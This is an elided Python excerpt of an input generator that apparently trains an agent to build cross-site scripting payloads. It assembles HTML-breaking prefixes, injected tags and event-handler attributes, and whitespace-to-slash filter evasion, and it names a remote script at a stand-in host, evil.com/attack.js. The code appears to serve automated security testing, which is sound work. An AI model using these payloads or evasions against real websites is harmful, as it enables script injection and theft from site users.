...
class InputGenerator:
    ...
    def __init__(self):
        ...
        self.INITIAL_STATUS = np.zeros(obs.STATE_SIZE, dtype=np.float32)
        self.prefixList = ["--> ", '"> ', "", "'> ", "/> ", '> ', ';} ']
        self.prefixHTMLList = ['"> ', "'> ", "/> ", '> ']
        self.prefixComment = "--> "
        self.prefixStyle = ';} '
        ...
        self.JSFILEPayload = "https://evil.com/attack.js"
        self.backbracket = "</"
        self.backbracket2 = ">"
        self.suffixList = ["<!--", "//", ""]
        self.previous_input = ""
    ...
    def do_action(self, action):
        add_random = True
        # random integer for detecion of attack string in the html page
        ...
        # ------------------------------------
            ...
            if self.tag in ["script"] + self.mediaTag + self.linkTag:
                ...
                self.tag = ''.join(
                    [self.original_tag[0:length // 2], self.original_tag, self.original_tag[length // 2:length]])
                self.status[obs.TAG_INSERTED] = 1
        ...
        if self.tag != "":
            if self.use_saved_tag:
                generated_input = ''.join(
                    [self.prefix, "</", choice(self.effective_tag), ">", self.forebracket1, self.tag])
            else:
            ...
            if self.event:
                if self.attribute != "string" and self.attribute != "STRING" and action:
                    generated_input = ''.join(
                        [generated_input, " ", self.attribute, "=\'x\' ", self.event, "=", self.value, " ",
                         self.forebracket2])
                else:
                    generated_input = ''.join(
                        [generated_input, " ", self.event, "=", self.value, " ", self.forebracket2])
            elif self.attribute != "string":
                generated_input = ''.join(
                    [generated_input, " ", self.attribute, "=", self.value, " ", self.forebracket2])
            else:
        ...
        if action == act.WHITE_SPACE_TO_SLASH:
            generated_input = self.white_space_to_slash(generated_input)
            self.status[obs.NO_WHITE_SPACE] = 1
        ...
        # make observation about generated input
        ...
        if self.status[obs.DEFAULT_PAYLOAD_TYPE] == 1 and add_random and self.tag != "":
            ...
            return ''.join([generated_input, str(self.random_tag)]) , self.status
        else:
            return generated_input, self.status
    ...
    def white_space_to_slash(self, result):
